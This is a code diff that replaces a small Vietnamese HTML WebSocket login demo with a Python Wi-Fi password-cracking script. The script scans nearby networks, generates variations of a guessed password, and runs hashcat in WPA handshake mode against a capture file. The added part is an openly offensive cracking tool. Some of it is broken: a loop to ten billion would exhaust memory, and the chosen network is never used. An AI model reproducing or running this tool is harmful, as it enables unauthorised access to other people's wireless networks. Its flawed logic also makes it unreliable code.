@@ -1,56 +1,102 @@
-<!DOCTYPE html>
-<html lang="vi">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>WebSocket Demo</title>
-</head>
-<body>
-  <h1>Nhập thông tin người dùng</h1>
-  
-  <label for="username">Tên người dùng:</label>
-  <input type="text" id="username" placeholder="Nhập tên người dùng">
-  <br><br>
+import subprocess
+import os
 
-  <label for="password">Mật khẩu:</label>
-  <input type="password" id="password" placeholder="Nhập mật khẩu">
-  <br><br>
+# Hàm quét các mạng Wi-Fi hiện có (Windows sử dụng netsh, Linux sử dụng iwlist)
+def scan_wifi_networks():
+    networks = []
+    try:
+        if os.name == 'nt':  # Nếu chạy trên Windows
+            result = subprocess.run(['netsh', 'wlan', 'show', 'network'], capture_output=True, text=True)
+            networks = parse_networks_windows(result.stdout)
+        else:  # Nếu chạy trên Linux (hoặc MacOS)
+            result = subprocess.run(['iwlist', 'scan'], capture_output=True, text=True)
+            networks = parse_networks_linux(result.stdout)
+    except Exception as e:
+        print(f"Error scanning networks: {e}")
+    return networks
 
-  <button onclick="sendData()">Gửi thông tin</button>
+# Hàm phân tích kết quả quét mạng trên Windows
+def parse_networks_windows(output):
+    networks = []
+    for line in output.splitlines():
+        if "SSID" in line:
+            networks.append(line.split(":")[1].strip())
+    return networks
 
-  <h2>Thông tin từ Server:</h2>
-  <div id="response">Chưa có dữ liệu từ server.</div>
+# Hàm phân tích kết quả quét mạng trên Linux
+def parse_networks_linux(output):
+    networks = []
+    for line in output.splitlines():
+        if "ESSID" in line:
+            networks.append(line.split(":")[1].strip().replace('"', ''))
+    return networks
 
-  <script>
-    // Kết nối WebSocket tới server
-    const socket = new WebSocket('ws://localhost:3000');
+# Hàm sinh các biến thể của mật khẩu
+def generate_variations(base_password):
+    variations = set()
 
-    socket.onopen = () => {
-      console.log('Đã kết nối đến server');
-    };
+    # Thêm các số vào cuối (1 đến 9999999999)
+    for i in range(1, 10000000000):  # Thử từ 1 đến 9999999999
+        variations.add(base_password + str(i))
+    
+    # Thay đổi chữ cái (viết hoa, viết thường)
+    variations.add(base_password.capitalize())  # Chữ cái đầu viết hoa
+    variations.add(base_password.lower())       # Tất cả viết thường
+    variations.add(base_password.upper())       # Tất cả viết hoa
+    
+    # Thêm ký tự đặc biệt
+    special_chars = ['@', '#', '$', '%', '&', '!', '*']
+    for char in special_chars:
+        variations.add(base_password + char)  # Thêm ký tự đặc biệt vào cuối
+        variations.add(char + base_password)  # Thêm ký tự đặc biệt vào đầu
+    
+    # Thêm biến thể đảo ngược từ gốc
+    variations.add(base_password[::-1])  # Đảo ngược chuỗi mật khẩu
+    
+    return variations
 
-    socket.onmessage = (event) => {
-      document.getElementById('response').textContent = event.data;
-    };
+# Hàm brute force thử tất cả các biến thể với Hashcat
+def brute_force_with_hashcat(handshake_file, base_password):
+    variations = generate_variations(base_password)
+    print(f"Attempting to brute force with base password: {base_password}")
 
-    socket.onerror = (error) => {
-      console.log('Lỗi WebSocket:', error);
-    };
+    # Lưu mật khẩu vào tệp tạm thời để sử dụng với Hashcat
+    with open("temp_wordlist.txt", "w") as f:
+        for password in variations:
+            f.write(password + "\n")
+    
+    # Chạy Hashcat với wordlist tạm thời
+    command = f"hashcat -m 2500 -a 0 {handshake_file} temp_wordlist.txt"
+    print(f"Running Hashcat command: {command}")
+    
+    try:
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        if ' cracked' in result.stdout:
+            print("Password cracked successfully!")
+        else:
+            print("Password not found.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+    finally:
+        # Xóa file wordlist tạm thời
+        os.remove("temp_wordlist.txt")
 
-    socket.onclose = () => {
-      console.log('WebSocket kết thúc kết nối');
-    };
+if __name__ == "__main__":
+    # Quét các mạng Wi-Fi
+    print("Scanning for Wi-Fi networks...")
+    networks = scan_wifi_networks()
+    if networks:
+        print("Available Wi-Fi networks:")
+        for i, network in enumerate(networks, 1):
+            print(f"{i}. {network}")
+        network_choice = int(input("Select the network by number: "))
+        selected_network = networks[network_choice - 1]
+        print(f"Selected network: {selected_network}")
+    else:
+        print("No networks found.")
+        exit(1)
 
-    // Gửi dữ liệu từ form tới server
-    function sendData() {
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-      
-      const userData = { username, password };
-      
-      // Gửi dữ liệu qua WebSocket
-      socket.send(JSON.stringify(userData));
-    }
-  </script>
-</body>
-</html>
+    # Nhập tên file handshake và mật khẩu cơ sở
+    handshake_file = input("Enter the path to the capture file (e.g., capture.hccapx): ")  # File handshake
+    base_password = input("Enter the base password or guess: ")  # Nhập mật khẩu cơ sở từ người dùng
+    brute_force_with_hashcat(handshake_file, base_password)
